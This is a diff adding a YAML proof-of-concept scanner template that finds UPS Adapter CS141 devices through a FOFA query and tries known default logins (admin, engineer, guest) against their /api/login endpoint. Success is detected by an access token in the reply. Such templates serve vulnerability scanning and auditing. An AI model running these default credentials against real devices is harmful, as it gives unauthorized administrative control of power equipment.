@@ -1,0 +1,32 @@
+id: poc-yaml-ups-adapter-cs141-snmp-default-login
+info:
+  name: UPS Adapter CS141 SNMP 默认账号密码登录漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: cs141
+  fofa: body="CS141"
+variables:
+  user: 'admin
+
+    engineer
+
+    guest'
+  passwd: 'cs141-snmp
+
+    engineer
+
+    guest'
+firstRequest:
+  method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"CS141")
+requests:
+- method: POST
+  path: /api/login
+  headers:
+    Content-Type: application/json
+  data: '{"userName":"{{.user}}","password":"{{.passwd}}"}'
+  expression: status_code == 200 && contains(body,"accessToken") && contains(body,"AdminFirstTime")
+    && !contains(body,"<") && contains(content_type,"application/json")
+transport: http
